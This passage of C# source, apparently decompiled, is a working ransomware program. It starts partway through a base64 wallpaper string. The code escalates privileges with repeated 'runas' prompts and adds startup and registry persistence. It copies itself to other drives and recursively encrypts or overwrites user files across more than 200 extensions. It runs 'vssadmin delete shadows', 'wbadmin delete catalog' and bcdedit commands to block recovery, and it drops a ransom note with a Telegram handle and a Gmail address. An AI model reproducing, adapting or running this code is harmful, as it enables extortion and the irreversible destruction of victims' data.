AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASgBPJygBPMnKAE8nKAE8nKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH//Z";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[4] { "All your files have been encrypted and trampled by the serial killer. If you don't pay the ransom before the time is up, I have put a file in your hard drive that will delete all your files with no way to recover them. It will destroy your hard drive as it did with your files, and you will not be able to download a new  version of Windows.  When you pay for the ransom, I will give you a small program that will decrypt all your files and erase the hidden file. The important thing is that you pay the ransom before the time runs out, because if the time runs out, I cannot help you. The ransom price is only $20. I accept most payment methods. Contact me as soon as possible.", "", "telegram: @nksawq", "Email: yohmony38@gmail.com" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>19/VOM2DrPfQKVPx0U7JMP7j2cGyIZQwV4nejZ0LwbnEJtN4Ze1jHOx1uVVhrVfRLHCRgz5pKk6DMSXJ3zTmrBy+wUX9O51KB53Wz1DEYmCzxEJLgDeBmsGZMnuebWiQUqLmlfic+uO/NhTcVEFXkMtmaq4YAeX3M14w/45QtRE=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
